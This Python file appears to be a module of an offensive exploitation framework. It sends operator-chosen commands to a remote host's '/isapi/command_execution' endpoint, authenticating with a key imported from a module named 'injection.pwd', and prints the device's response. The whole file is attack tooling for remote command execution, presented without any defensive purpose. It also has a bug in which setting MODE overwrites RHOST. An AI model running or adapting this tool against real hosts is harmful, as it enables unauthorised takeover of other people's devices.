from base import core
from base.response import fromstring
from injection.pwd import AUTH_KEY

class ExecutorModule(core.BaseModule):
    def __init__(self) -> None:
        super().__init__("/isapi/command_execution", 4)

        self.COMMAND  = 0
        self.RHOST    = 1
        self.PARAM    = 2
        self.MODE     = 3
        self.set_option(3, "http")

    def show_options(self): 
        l_option = self.len_of(["Rhost", "command", "option", "param"])
        l_required = self.len_of(["yes", "no", "Required"])
        l_value = self.len_of([self.get_option(self.RHOST), self.get_option(self.MODE),
                                self.get_option(self.PARAM), self.get_option(self.COMMAND),
                                "value"])

        self.print_table(l_option, l_required, l_value, 
                        [["OPTION", "REQUIRED", "VALUE"],
                        ["RHOST", "yes", self.get_option(self.RHOST)],
                        ["MODE", "no", self.get_option(self.MODE)],
                        ["COMMAND", "yes", self.get_option(self.COMMAND)],
                        ["PARAM", "no", self.get_option(self.PARAM)]])

    def _set_(self, a: str):
        if a[1] in  ["COMMAND", "command"]:
            self.set_option(self.COMMAND, str(a[2]))
            print(f" COMMAND → {self.get_option(self.COMMAND)}\n")
        elif a[1] in ["RHOST", "rhost"]:
            self.set_option(self.RHOST, str(a[2]))
            print(f" RHOST → {self.get_option(self.RHOST)}\n")
        elif a[1] in ["MODE", "mode"]:
            self.set_option(self.RHOST, "https" if a[2] == "https" else "http")
            print(f" MODE → {self.get_option(self.RHOST)}\n")
        elif a[1] in ["PARAM", "param"]:
            if len(str(a[2]).split("=")) == 2:
                self.set_option(self.PARAM, str(a[2]))
                print(f" PARAM → {self.get_option(self.PARAM)}\n")
        else:
            print(f" [!] Unexpected command: {a[1]}\n")

    def run(self):
        if not core.nonNull(self.get_option(self.COMMAND)):
            print(f" [!] Cannot run without a command: {self.get_option(self.COMMAND)}")  
            return

        print("\n [*] Checking IP...")
        if not core.check_ip_back(self.get_option(self.RHOST)):
            print(f" [!] Cannot run without a host: {self.get_option(self.RHOST)}")
            return

        url_t = f"{self.get_option(3)}://{self.get_option(1)}{self.get_option(0)}?auth={AUTH_KEY}"

        if core.nonNull(self.get_option(2)) and self.get_option(2) != " ":
            url_t += f"&{self.get_option(2)}"

        print(f"\n [*] Running with: '{url_t}'")
        page = core.fetch_url(url_t)
        if not page:
            print(" [!] Access-Error: Try that URL in your browser it may works!")
            return
        print(" [*] Got a response!\n")

        try:
            respnse = fromstring(page.text)
            print(respnse.toXml())
        except:
            print(page.text)

        print("\n[*] Successfully executed!\n")


